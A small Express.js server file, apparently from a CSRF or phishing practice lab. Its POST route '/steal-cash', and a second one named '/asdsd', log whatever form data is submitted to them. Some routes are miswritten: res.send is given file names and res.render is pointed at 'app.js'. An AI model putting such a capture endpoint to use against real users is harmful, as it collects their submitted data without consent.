const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(express.urlencoded({extended: true}));
app.use(express.json());

var urlencodedParser = bodyParser.urlencoded({ extended: false });

app.use(express.static('form'));

app.set('view engine', 'ejs');

app.get('/profile', (req, res) => {
    res.send('index.html', { root: __dirname });
});

app.get('/login', (req, res) => {
    res.send('results.html', { root: __dirname });
});

app.post('/steal-cash', urlencodedParser, function(req, res){
    console.log(req.body);
});

app.post('/asdsd', urlencodedParser, function(req,res){
    console.log(req.body);
});

app.get('/', function(req, res) {
    res.render("app.js");
})

app.listen(port, () => console.log(`listening on port ${port}!`));